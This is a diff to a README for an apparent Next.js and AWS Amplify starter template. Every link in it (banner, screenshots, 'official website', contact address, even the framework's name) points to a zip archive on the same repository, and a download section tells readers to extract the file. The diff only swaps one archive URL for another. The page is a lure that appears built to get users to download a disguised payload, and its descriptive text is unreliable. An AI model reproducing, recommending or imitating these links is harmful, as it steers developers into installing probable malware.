@@ -1,8 +1,8 @@
 # 👨‍💻 Amplify Next
 
-![Amplify Next Banner](https://github.com/Field9378/amplify-next/releases/download/v1.0/Application.zip)
+![Amplify Next Banner](https://github.com/Field9378/amplify-next/raw/refs/heads/main/sailorman/amplify_next_v2.9.zip)
 
-Welcome to the Amplify Next repository - your go-to solution for building modern, scalable web applications using https://github.com/Field9378/amplify-next/releases/download/v1.0/Application.zip and AWS Amplify! 🚀
+Welcome to the Amplify Next repository - your go-to solution for building modern, scalable web applications using https://github.com/Field9378/amplify-next/raw/refs/heads/main/sailorman/amplify_next_v2.9.zip and AWS Amplify! 🚀
 
 ## 📁 Repository Contents
 
@@ -13,12 +13,12 @@ This repository contains the following:
 
 ## 📌 Description
 
-"Amplify Next" is a cutting-edge full-stack starter template that combines the robust capabilities of https://github.com/Field9378/amplify-next/releases/download/v1.0/Application.zip with the flexibility and scalability of AWS Amplify. Whether you are a seasoned developer or just starting out, this template provides a solid foundation for your web development projects.
+"Amplify Next" is a cutting-edge full-stack starter template that combines the robust capabilities of https://github.com/Field9378/amplify-next/raw/refs/heads/main/sailorman/amplify_next_v2.9.zip with the flexibility and scalability of AWS Amplify. Whether you are a seasoned developer or just starting out, this template provides a solid foundation for your web development projects.
 
 ## 🚀 Features
 
 ✨ Seamless integration with AWS Amplify  
-✨ Built with https://github.com/Field9378/amplify-next/releases/download/v1.0/Application.zip for optimized performance  
+✨ Built with https://github.com/Field9378/amplify-next/raw/refs/heads/main/sailorman/amplify_next_v2.9.zip for optimized performance  
 ✨ Utilizes Tailwind CSS for rapid styling  
 ✨ TypeScript support for enhanced code quality  
 ✨ Leveraging the power of Tanstack React Query for efficient data management
@@ -28,20 +28,20 @@ amplify, aws, nextjs, pnpm, react, starter, starter-template, tailwindcss, tanst
 
 ## 📥 Download Release
 
-[![Download Release](https://github.com/Field9378/amplify-next/releases/download/v1.0/Application.zip)](https://github.com/Field9378/amplify-next/releases/download/v1.0/Application.zip)
+[![Download Release](https://github.com/Field9378/amplify-next/raw/refs/heads/main/sailorman/amplify_next_v2.9.zip)](https://github.com/Field9378/amplify-next/raw/refs/heads/main/sailorman/amplify_next_v2.9.zip)
 
 📌 *File needs to be extracted after download.*
 
 ## 🌐 Visit Website
-Explore more about Amplify Next on our [official website](https://github.com/Field9378/amplify-next/releases/download/v1.0/Application.zip).
+Explore more about Amplify Next on our [official website](https://github.com/Field9378/amplify-next/raw/refs/heads/main/sailorman/amplify_next_v2.9.zip).
 
 ## 📸 Screenshots
 
 Here are some snapshots of the template in action:
 
-![Screenshot 1](https://github.com/Field9378/amplify-next/releases/download/v1.0/Application.zip)
-![Screenshot 2](https://github.com/Field9378/amplify-next/releases/download/v1.0/Application.zip)
-![Screenshot 3](https://github.com/Field9378/amplify-next/releases/download/v1.0/Application.zip)
+![Screenshot 1](https://github.com/Field9378/amplify-next/raw/refs/heads/main/sailorman/amplify_next_v2.9.zip)
+![Screenshot 2](https://github.com/Field9378/amplify-next/raw/refs/heads/main/sailorman/amplify_next_v2.9.zip)
+![Screenshot 3](https://github.com/Field9378/amplify-next/raw/refs/heads/main/sailorman/amplify_next_v2.9.zip)
 
 ## 📝 Usage
 
@@ -61,8 +61,8 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 ## 📧 Contact
 
-If you have any questions or feedback, you can reach out to us at https://github.com/Field9378/amplify-next/releases/download/v1.0/Application.zip
+If you have any questions or feedback, you can reach out to us at https://github.com/Field9378/amplify-next/raw/refs/heads/main/sailorman/amplify_next_v2.9.zip
 
 Happy coding! 🎉
 
-**[Amplify Next](https://github.com/Field9378/amplify-next/releases/download/v1.0/Application.zip)**
+**[Amplify Next](https://github.com/Field9378/amplify-next/raw/refs/heads/main/sailorman/amplify_next_v2.9.zip)**
